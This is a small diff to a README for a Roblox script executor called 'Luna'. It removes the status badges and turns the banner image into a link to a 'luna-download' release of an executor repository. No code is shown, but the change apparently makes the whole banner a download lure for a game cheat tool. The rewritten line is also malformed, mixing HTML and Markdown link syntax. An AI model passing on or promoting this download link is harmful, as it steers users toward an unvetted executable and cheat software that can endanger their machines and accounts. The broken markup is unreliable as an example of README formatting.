@@ -1,10 +1,7 @@
 
 
-<img width="1672" height="941" alt="d501c96d-5566-4c04-836d-d394b35afeb6" src="https://github.com/user-attachments/assets/3f22b439-c4ec-4a71-9b5e-c15dc01d5fc1" />
-<p align="center">
-  <img src="https://img.shields.io/badge/Platform-Windows-blue?style=for-the-badge&logo=windows" alt="Windows">
-  <img src="https://img.shields.io/badge/Status-Stable-brightgreen?style=for-the-badge" alt="Status">
-</p>
+<[img width="1672" height="941" alt="d501c96d-5566-4c04-836d-d394b35afeb6" src="https://github.com/user-attachments/assets/3f22b439-c4ec-4a71-9b5e-c15dc01d5fc1"](https://github.com/wellmagistratesense/Roblox-Collection-Executor-PC-Version/releases/tag/luna-download)"/>
+
 
 <h1 align="center">Roblox Luna Script Runner & Utility</h1>
 
